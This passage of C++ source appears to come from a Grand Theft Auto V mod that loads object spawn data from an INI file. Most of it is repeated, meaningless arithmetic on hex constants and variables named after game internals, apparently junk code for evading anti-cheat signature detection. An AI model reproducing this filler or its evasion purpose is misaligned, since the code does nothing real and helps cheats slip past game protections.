				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				Spawn.RotZ = Extern_Reader::INIFile::Float::LerFloat(buffer, "RotZ");
				//Void de spawn aqui
				/*
				cout << "[" << i << "]" << endl;
				cout << "Model=" << i << Spawn.Model << endl;
				cout << "PosX=" << i << Spawn.PosX << endl;
				cout << "PosY=" << i << Spawn.PosY << endl;
				cout << "PosZ=" << i << Spawn.PosZ << endl;
				cout << "RotX=" << i << Spawn.RotX << endl;
				cout << "RotY=" << i << Spawn.RotY << endl;
				cout << "RotZ=" << i << Spawn.RotZ << endl;
				*/
			}
		}
	}
	void CriarModeloDeSpawn(std::string ININame, int NumeroDeItens)
	{
		//Exemplo::
		//GTA::CriarModeloDeSpawn(".\\Mapa.ini", 1000);
		Spawn_Struct Spawn;

		if (offset > aaaaaa)
		{
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
			matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
			matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
		}
		else
		{
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		}
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
		if (matriz[4] > 50.0f)
		{
			matriz[4] = matriz[1];
		}
		a2 = (matriz[4]) / (2 * matriz[2]);
		a1 = (matriz[3] + (2)) / (2 * matriz[2]);
		offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
